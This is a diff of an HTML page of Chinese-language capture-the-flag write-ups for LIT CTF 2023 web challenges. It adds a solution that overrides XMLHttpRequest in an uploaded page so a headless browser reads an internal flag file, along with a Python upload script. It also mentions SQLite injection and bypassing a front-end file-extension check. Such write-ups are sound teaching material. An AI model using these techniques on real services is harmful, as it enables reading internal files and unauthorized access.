@@ -20,7 +20,7 @@
     <link rel="index" title="Index" href="../../genindex.html" />
     <link rel="search" title="Search" href="../../search.html" />
     <link rel="next" title="TAMUctf 2023" href="tamu.html" />
-    <link rel="prev" title="Welcome to CTF’s documentation!" href="../../index.html" /> 
+    <link rel="prev" title="MirRoR4s’s CTF" href="../../index.html" /> 
 </head>
 
 <body class="wy-body-for-nav"> 
@@ -74,9 +74,14 @@
 <li class="toctree-l4"><a class="reference internal" href="#id7">题目分析</a></li>
 </ul>
 </li>
+<li class="toctree-l3"><a class="reference internal" href="#too-much-kirby">too much kirby</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id8">题目分析</a></li>
 </ul>
 </li>
-<li class="toctree-l2"><a class="reference internal" href="#id8">引用</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#art-contest">Art Contest</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#id9">引用</a></li>
 </ul>
 </li>
 <li class="toctree-l1"><a class="reference internal" href="tamu.html">TAMUctf 2023</a></li>
@@ -210,7 +215,7 @@ You can try it out here:http://litctf.org:31783/</p>
 <section id="id5">
 <h4>题目分析<a class="headerlink" href="#id5" title="Permalink to this heading"></a></h4>
 <p>源码很长，是一个 TypeScirpt 的。然后做的事情是用 OCR 扫描图片提取文本，之后有一个 sqlite 的数据库操作。</p>
-<p>源码还看不太懂，跟着 gpt 慢慢来。大概看懂了，flag 在数据库的某个表里面，代码有执行一个查询操作，不过是根据车牌号来查的，flag 就是这个车牌的金额。</p>
+<p>~~源码还看不太懂，跟着 gpt 慢慢来。~~大概看懂了，flag 在数据库的某个表里面，代码有执行一个查询操作，不过是根据车牌号来查的，flag 就是这个车牌的金额。</p>
 <p>打开题目是让我传一个仅包含文本的车牌图片，然后它会识别车牌，告诉我这个车牌对应的一些信息。糟糕的点是 flag 的车牌号是随机生成的，看上去没办法直接获得 flag。难道说代码的随机数生成是有问题的吗？或许这是一个值得思考的点。</p>
 <p>emmm，我没有注意到 select 的时候没有对参数进行过滤，所以这实际上是一个简单的 sqlite 注入。</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>`SELECT * FROM plates WHERE plate = &quot;${text}&quot;`
@@ -271,11 +276,87 @@ You can try it out here:http://litctf.org:31783/</p>
 <p>fetch me the flag at http://litctf.org:31770/</p>
 <section id="id7">
 <h4>题目分析<a class="headerlink" href="#id7" title="Permalink to this heading"></a></h4>
+<p>这个题目为什么好眼熟…..</p>
+<p>思路也比较简单，根据源码可以知道访问 6969 端口就可以拿到 flag 文件，但是题目正常的业务逻辑仅仅只是访问了 6969 端口而并不会返回响应的 flag 文件：</p>
+<p><img alt="image-20230822165657380" src="../../_images/image-20230822165657380.png" /></p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">newPage</span> <span class="pre">+</span> <span class="pre">goto</span> <span class="pre">打开我们上传的</span> <span class="pre">html</span> <span class="pre">页面</span></code></p>
+<p><code class="docutils literal notranslate"><span class="pre">evaluate</span> <span class="pre">在打开的页面中执行</span> <span class="pre">js</span></code></p>
+</div></blockquote>
+<p>面对这种情况，有一个很神奇的做法，就是像 js 原型链污染那样去修改 XMLHTTPRequest 的原型，让其的 open 和 send 能够访问 6969 端口并输出 flag 文件的内容。exp 如下：</p>
+<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;en&quot;</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;viewport&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;width=device-width, initial-scale=1.0&quot;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Document<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;h&quot;</span><span class="p">&gt;</span>test<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">        </span><span class="nb">window</span><span class="p">.</span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mf">1</span><span class="p">])</span>
+<span class="w">                </span><span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+<span class="w">                </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">txt</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;h&quot;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">txt</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/(.{10})/g</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;$1\n&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;**DONE**&quot;</span><span class="p">)</span>
+
+<span class="w">            </span><span class="c1">//document.getElementById(&quot;h&quot;).innerHTML = args[1].replace(/(.{10})/g, &#39;$1\n&#39;) + &quot;    done&quot;;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="nb">window</span><span class="p">.</span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">}</span>
+
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+</div>
+<p>以上是核心的 exp，现在编写 python脚本进行全部的处理：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+<span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://litctf.org:31770/runHTML&quot;</span>
+    
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;./exp.html&quot;</span><span class="p">,</span><span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+        <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;file&quot;</span> <span class="p">:</span> <span class="p">(</span><span class="s2">&quot;exp.html&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="s1">&#39;text/html&#39;</span><span class="p">)}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+        <span class="n">ans</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span>
+        <span class="n">image</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">ans</span><span class="p">))</span>
+        <span class="n">image</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s2">&quot;flag.png&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;check!&quot;</span><span class="p">)</span>
+    
+    
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+
+</pre></div>
+</div>
+<p><img alt="image-20230822171346213" src="../../_images/image-20230822171346213.png" /></p>
 </section>
 </section>
-</section>
+<section id="too-much-kirby">
+<h3>too much kirby<a class="headerlink" href="#too-much-kirby" title="Permalink to this heading"></a></h3>
+<p><strong>题目描述</strong></p>
+<p>literally every single unused web chal jammed into one kirby-sized package (horrible painful amalgamation)</p>
 <section id="id8">
-<h2>引用<a class="headerlink" href="#id8" title="Permalink to this heading"></a></h2>
+<h4>题目分析<a class="headerlink" href="#id8" title="Permalink to this heading"></a></h4>
+<p><strong>非预期：</strong></p>
+<p>/challenge5 上传文件就可以拿到 flag，这里需要绕过一下前端的后缀名检测。</p>
+<p><img alt="image-20230822233536241" src="../../_images/image-20230822233536241.png" /></p>
+<p>预期解当然就是绕过前四关然后拿到 flag，这里第三关我暂时没想出来如何绕过。等待wp中….</p>
+</section>
+</section>
+<section id="art-contest">
+<h3>Art Contest<a class="headerlink" href="#art-contest" title="Permalink to this heading"></a></h3>
+<p><a class="reference external" href="https://blog.junron.dev/writeups/web/art-contest.html">Art Contest | Jro’s Blog (junron.dev)</a></p>
+</section>
+</section>
+<section id="id9">
+<h2>引用<a class="headerlink" href="#id9" title="Permalink to this heading"></a></h2>
 <p><a class="reference external" href="https://nolliv22.com/categories/lit-ctf-2023/">LIT CTF 2023 | Nolliv22</a></p>
 </section>
 </section>
@@ -284,7 +365,7 @@ You can try it out here:http://litctf.org:31783/</p>
            </div>
           </div>
           <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
-        <a href="../../index.html" class="btn btn-neutral float-left" title="Welcome to CTF’s documentation!" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="../../index.html" class="btn btn-neutral float-left" title="MirRoR4s’s CTF" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
         <a href="tamu.html" class="btn btn-neutral float-right" title="TAMUctf 2023" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
     </div>
 
